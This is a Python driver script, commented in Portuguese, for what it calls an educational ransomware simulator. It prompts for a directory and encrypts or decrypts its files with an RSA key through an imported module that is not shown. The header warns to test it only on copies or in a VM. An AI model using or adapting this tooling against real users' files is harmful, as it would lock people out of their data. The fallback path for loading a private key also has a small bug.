"""
Nome do arquivo: encoderV3.py
Descrição: Esse programa simula um comportamento de ransomware
           feito para fins educacionais. Por favor, tenha em mente que
           esse código vai realmente cumprir o que ele promete, então
           tome cuidado ao executar suas funções e não utilize-o para
           prejudicar outras pessoas. Você será o único responsável
           por quaisquer ações.
Autor: Erik Gabriel
Github: https://github.com/erikgabriel07
Versão: 1.0
Data: 03/12/2024
Licença: MIT

Instruções:

1. Certifique-se de criar um diretório separado com cópias de arquivos
para testar o programa, ou ainda em usar dentro de uma máquina virtual
para evitar que seus arquivos importantes sejam criptografados.

2. Não utilize esse programa para manipular dados sensíveis ou protegidos
sem autorização.

3. O uso dessa ferramenta é de total responsabilidade do usuário.

Termos de Responsabilidade:

O SOFTWARE É FORNECIDO "NO ESTADO EM QUE SE ENCONTRA", SEM GARANTIA DE
QUALQUER TIPO, EXPRESSA OU IMPLÍCITA, INCLUINDO, MAS NÃO SE LIMITANDO ÀS
GARANTIAS DE COMERCIALIZAÇÃO, ADEQUAÇÃO A UMA FINALIDADE ESPECÍFICA E NÃO
VIOLAÇÃO. EM NENHUMA HIPÓTESE OS AUTORES OU DETENTORES DE DIREITOS AUTORAIS
SERÃO RESPONSÁVEIS POR QUALQUER REIVINDICAÇÃO, DANO OU OUTRA RESPONSABILIDADE,
SEJA EM UMA AÇÃO DE CONTRATO, ATO ILÍCITO OU DE OUTRA FORMA, DECORRENTE DE, FORA
DE OU EM CONEXÃO COM O SOFTWARE OU COM O USO OU OUTRAS NEGOCIAÇÕES COM O SOFTWARE.
O AUTOR NÃO SERÁ RESPONSÁVEL POR QUAISQUER DANOS, DIRETOS OU INDIRETOS, CAUSADOS
PELO USO DESTE SOFTWARE, INCLUINDO PERDA DE DADOS, INTERRUPÇÕES DE SERVIÇOS OU
QUALQUER OUTRO PROBLEMA.
AO UTILIZAR ESTE PROGRAMA, VOCÊ ACEITA TOTAL RESPONSABILIDADE PELAS CONSEQUÊNCIAS
DE SEU USO.
"""

__author__ = 'Erik Gabriel'
__github__ = 'https://github.com/erikgabriel07'
__version__ = '1.0'


import base64, os
from cryptography.hazmat.primitives import serialization
from src.process_files import ProcessFiles
from questionary import prompt, Style



# Use base64.urlsafe_b64encode("Your public key") to generate
# a base64 PUBLIC KEY. This program will only works with a PUBLIC
# KEY in base64, so make sure you've did the procediment above to
# avoid errors. To avoid any mistakes, the python file generate_keyPem
# will generate your public key base64 too, so you need just to copy and
# paste here. :)
pub_key = b'Your public key in base64'


def load_pub_key(key):
    key_pem = base64.urlsafe_b64decode(key)
    
    return serialization.load_pem_public_key(key_pem)
    
    
def menu_options():
    style = Style([
        ('qmark', 'fg:#fac731 bold'),        # Cor do símbolo de pergunta (ex: ?)
        ('question', 'fg:#ff5733 bold'),     # Cor do texto da pergunta
        ('answer', 'fg:#00ff00 bold'),       # Cor da resposta selecionada
        ('pointer', 'fg:#00ffff bold'),      # Cor do ponteiro na seleção
        ('highlighted', 'fg:#ff00ff bold'),  # Cor da opção destacada
        ('selected', 'fg:#00ff00'),          # Cor da opção selecionada
        ('separator', 'fg:#cc5454'),         # Cor do separador
        ('instruction', 'fg:#5f5f5f italic'),# Cor do texto de instrução
    ])
    
    questions = [
        {
            'type': 'rawselect',
            'name': 'choice',
            'message': 'Selecione uma opção para continuar',
            'instruction': '(Digite um número e pressione ENTER)',
            'choices': [
                'Encriptar', 'Decriptar', 'Sair'
            ]
        }
    ]
    
    answer = prompt(questions=questions, style=style)
    
    return answer


def main():
    print(f'Autor: {__author__} | Github: {__github__} | Versão: {__version__}')
    print('\nLEIA ATENTAMENTE O TERMO DE RESPONSABILIDADE ANTES DE CONTINUAR.\n')
    
    try:
        dir_path = input('Caminho do diretório para encriptar: ')
        
        if not os.path.exists(dir_path) or not os.path.isdir(dir_path):
            print('O caminho fornecido não é válido!')
            exit(1)
        
        method = menu_options()
        
        if method['choice'] == 'Sair':
            exit(0)
    except KeyboardInterrupt as e:
        exit(1)
    
    if method['choice'] == 'Encriptar':
        ProcessFiles(load_pub_key(pub_key)).encrypt_files(dir_path)
        exit(0)
    if method['choice'] == 'Decriptar':
        try:
            with open('private.pem', 'rb') as file:
                priv_pem = file.read()
        except Exception as e:
            priv_pem = input('Type privatekey pem file path: ').strip()
            
            if not os.path.isfile(priv_pem):
                print('File not found!')
                exit(1)
        pv_key = serialization.load_pem_private_key(priv_pem, password=None)
        ProcessFiles(priv_key=pv_key).decrypt_files(dir_path)
    
if __name__ == '__main__':
    main()
